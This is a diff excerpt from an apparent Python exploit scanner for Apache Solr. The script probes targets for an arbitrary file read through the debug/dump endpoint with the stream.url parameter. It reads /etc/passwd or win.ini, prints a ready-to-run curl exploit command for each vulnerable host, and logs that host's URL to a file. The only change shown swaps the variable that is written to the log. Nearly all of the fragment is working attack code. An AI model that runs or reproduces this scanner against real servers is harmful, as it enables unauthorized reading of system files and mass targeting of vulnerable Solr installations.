@@ -50,13 +50,13 @@ def exp(url):
                 if 'root:x:0:0:' in x.text:
                     exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                     print("[+ !vul -- {} --".format(exp))
-                    f.write(line+"\n")
+                    f.write(url+"\n")
                     return True
                 x = requests.post(bUrl,headers=bHeader,data=cPost,verify=False,timeout=20)
                 if 'extensions' in x.text:
                     exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                     print("[+ !vul -- {} --".format(exp))
-                    f.write(line+"\n")
+                    f.write(url+"\n")
                     return True
 
         except Exception as httperror:
